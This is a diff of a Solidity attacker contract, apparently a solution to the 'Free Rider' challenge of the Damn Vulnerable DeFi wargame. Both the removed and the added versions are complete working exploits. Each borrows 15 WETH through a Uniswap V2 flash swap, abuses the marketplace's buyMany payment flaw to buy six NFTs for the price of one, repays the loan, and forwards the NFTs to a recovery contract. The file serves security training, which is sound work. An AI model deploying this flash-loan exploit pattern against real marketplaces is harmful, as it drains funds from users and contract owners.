@@ -1,134 +1,80 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-import "hardhat/console.sol";
-import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
-import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
-import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
 import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
-import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
-import "../free-rider/FreeRiderNFTMarketplace.sol";
+interface IMarketplace {
+    function buyMany(uint256[] calldata tokenIds) external payable;
+}
 
+contract AttackFreeRider {
 
+    IUniswapV2Pair private immutable pair;
+    IMarketplace private immutable marketplace;
 
-contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
-    using Address for address;
+    IWETH private immutable weth;
+    IERC721 private immutable nft;
 
+    address private immutable recoveryContract;
+    address private immutable player;
 
-    address payable immutable weth;
-    address immutable dvt;
-    address immutable factory;
-    address payable immutable buyerMarketplace;
-    address immutable buyer;
-    address immutable nft;
-    address immutable owner;
+    uint256 private constant NFT_PRICE = 15 ether;
+    uint256[] private tokens = [0, 1, 2, 3, 4, 5];
 
-    constructor(
-        address payable _weth,
-        address _factory,
-        address _dvt,
-        address payable _buyerMarketplace,
-        address _buyer,
-        address _nft,
-        address _owner
-    )  {
-        weth = _weth;
-        dvt = _dvt;
-        factory = _factory;
-        buyerMarketplace = _buyerMarketplace;
-        buyer = _buyer;
-        nft = _nft;
-        owner = _owner;
+    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract){
+        pair = IUniswapV2Pair(_pair);
+        marketplace = IMarketplace(_marketplace);
+        weth = IWETH(_weth);
+        nft = IERC721(_nft);
+        recoveryContract = _recoveryContract;
+        player = msg.sender;
     }
 
-    event Log(string message, uint256 val);
+    function attack() external payable {
 
-    // Intiate flash swap
-    function flashSwap(address _tokenBorrow, uint256 _amount) external {
-
-        // Ensure there is a pair address contract available
-        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
-        require(pair != address(0), "!pair init");
-
-        address token0 = IUniswapV2Pair(pair).token0();
-        address token1 = IUniswapV2Pair(pair).token1();
-
-        // Ensure we are borrowing the correct token (WETH)
-        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
-        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;
-
-        bytes memory data = abi.encode(_tokenBorrow, _amount);
-
-        // Call uniswap for a flashswap
-        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
+        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
+        bytes memory data = abi.encode(NFT_PRICE);
+        pair.swap(NFT_PRICE, 0, address(this), data);
     }
 
-    // Flash Swap callback from UniSwap
-    function uniswapV2Call(
-        address sender,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external override {
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
 
-        address token0 = IUniswapV2Pair(msg.sender).token0();
-        address token1 = IUniswapV2Pair(msg.sender).token1();
-        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
+        // Access Control
+        require(msg.sender == address(pair));
+        require(tx.origin == player);
 
-        // Ensure the pair contract is the same as the sender
-        // and this contract was the one that initiated it.
-        require(msg.sender == pair, "!pair");
-        require(sender == address(this), "!sender");
+        // 2. Unwrap WETH to native ETH
+        weth.withdraw(NFT_PRICE);
 
-        // Decode custom data set in flashLoan()
-        (address tokenBorrow, uint256 amount) = abi.decode(
-            data,
-            (address, uint256)
-        );
+        // 3. Buy 6 NFTS for only 15 ETH total
+        marketplace.buyMany{value: NFT_PRICE}(tokens);
 
-        // Calculate Loan repayment
-        uint256 fee = ((amount * 3) / 997) + 1;
-        uint256 amountToRepay = amount + fee;
+        // 4. Pay back 15WETH + 0.3% to the pair contract
+        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
+        weth.deposit{value: amountToPayBack}();
+        weth.transfer(address(pair), amountToPayBack);
 
-        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));
-        // Withdraw all WETH to ETH
-        tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", currBal));
-
-        // Load uint256s (there is surely a better way to do this)
-        uint256[] memory tokenIds = new uint256[](6);
-        for (uint256 i = 0; i < 6; i++) {
-            tokenIds[i] = i;
+        // 5. Send NFTs to recovery contract so we can get the bounty
+        bytes memory data = abi.encode(player);
+        for(uint256 i; i < tokens.length; i++){
+            nft.safeTransferFrom(address(this), recoveryContract, i, data);
         }
-
-        // Purchase all NFTs for the Price of 1
-        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
-            tokenIds
-        );
-
-
-        // Transfer newly attained NFTs to Buyer Contract
-        for (uint256 i = 0; i < 6; i++) {
-            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i, abi.encode(owner));
-        }
-
-
-        // Deposit ETH into WETH contract
-        // ETH came from Buyer Contract + Marketplace exploit
-        (bool success,) = weth.call{value: 15.1 ether}("");
-        require(success, "failed to deposit weth");
-
-        // Pay back Loan with deposited WETH funds
-        IERC20(tokenBorrow).transfer(pair, amountToRepay);
+        
     }
 
-    // Interface required to receive NFT as a Smart Contract
     function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external override pure returns (bytes4) {
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure returns (bytes4) {
         return IERC721Receiver.onERC721Received.selector;
     }
 
-    receive () external payable {}
+
+    receive() external payable {}
+
 }
